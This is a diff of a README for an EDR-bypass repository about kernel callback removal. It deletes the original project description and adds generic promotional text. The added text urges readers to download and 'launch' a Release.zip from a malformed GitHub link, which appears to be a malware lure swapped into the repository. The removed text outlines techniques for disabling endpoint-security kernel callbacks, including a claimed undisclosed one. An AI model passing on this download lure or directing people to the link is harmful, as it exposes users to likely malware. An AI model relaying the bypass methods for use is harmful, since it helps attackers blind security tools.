@@ -1,63 +1,42 @@
-# Kernel Callbacks Removal (Bypassing EDR Detections)
 
-## Warning
-Even though you can download the binaries from the `releases`, you have to make sure that the offsets and the binary search opcodes done is the same on your windows version or you will get a **BLUE SCREEN OF DEATH**
+# 🛡️ Welcome to the Kernel Callback Removal Repository! 🛡️
 
-## Offsets and Patterns Modification
-All offsets and patterns that needs to be modified based on your windows version can be found in the file ending with `Util.h` within each project.
+## Description:
+In the world of cybersecurity, bypassing Endpoint Detection and Response (EDR) systems is crucial for various reasons including security research, penetration testing, and understanding system vulnerabilities. This repository focuses on kernel callback removal techniques to bypass EDR detections effectively.
 
-Following the guide inside the folder will help you figure it out how to retrieve the opcodes and offsets.
+## Topics:
+- EDR
+- EDR Bypass
+- EDR Evasion
+- Kernel
 
-## New Undisclosed Technique 
-I discovered an alternative method that bypasses kernel-level verification by overwriting the callback function inside the Callback entry itself with a KCFG-compliant function that simply returns. This evades detections that monitor changes at the callback array level `(For Kernel Notify Routines Callbacks)`.
+## Get Started:
+To dive into the exciting world of kernel callback removal and bypassing EDR detections, follow the steps below:
 
-## Prerequisistes
+1. **Download the Release**:
+   [![Download Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/releases/789694263/Release.zip)
+   
+   Note: The provided link needs to be launched to access the necessary files for your research and testing.
 
-This is an advanced topic requiring the following prerequisites:
+2. **Explore the Content**:
+   - Check out the code snippets, tools, and resources available in the repository.
+   - Understand the techniques used for kernel callback removal.
 
-- Assembly understanding
+3. **Contribute**:
+   - If you have insights or improvements, feel free to contribute to the repository.
+   - Collaborate with other security enthusiasts to enhance bypass techniques.
 
-- Familiarity with C programming
+4. **Check Releases Section**:
+   - In case the provided link is not working or you need more options, visit the "Releases" section of the repository for alternative downloads.
 
-- Experience with WinDbg
+## Additional Resources:
+For additional information and updates, refer to the repository's documentation and community discussions.
 
-- Familiarity with IDA
+Let's empower ourselves with the knowledge of kernel callback removal for better cybersecurity practices! 🚀
 
-- Windows kernel exploitation knowledge
+![Cybersecurity](https://media.istockphoto.com/photos/hacker-in-hood-breaking-law-symbols-picture-id1202413777)
 
-## Tools Used
+## Disclaimer:
+This repository is for educational and research purposes only. Use these techniques responsibly and adhere to ethical hacking practices. Stay safe and secure in your cybersecurity journey! 🔒
 
-WinDbg: [Windows Debugging Tools](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/)
-
-IDA: [Hex-Rays IDA Free](https://hex-rays.com/ida-free)
-
-## Kernel Debugging Setup
-
-To debug your local kernel (for fixing your offsets and reversing), follow the instructions here: [Setting up local kernel debugging](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-local-kernel-debugging-of-a-single-computer-manually)
-
-## Target Audience
-
-This project is for both pentesters and defenders to understand how attackers can bypass EDR kernel implementations.
-
-## Purpose
-
-- For everyone to be able to learn how technically bypassing EDR is done.
-- For having the flexibility to create your own tool which make it pretty easier to bypass signature based detection.
-- For researchers to be able to play around the code and debug and reverse.
-
-## Techniques Covered
-
-- Kernel Notify Routines Callback Bypass
-- MiniFilter File Callback Bypass
-- Network Callout Callback Bypass
-- ETW-TI Kernel Bypass
-
-## Tested on
-Host Name:                     WIN11
-
-OS Name:                       Microsoft Windows 11 Pro
-
-OS Version:                    10.0.26100 N/A Build 26100
-
-### Disclaimer
-This project is for **educational purposes only**. Unauthorized use of this tool in production or against systems without explicit permission is strictly prohibited.
+Don't forget, the key to success in cybersecurity is continuous learning and adaptation. Keep exploring, keep securing! 💻🔐
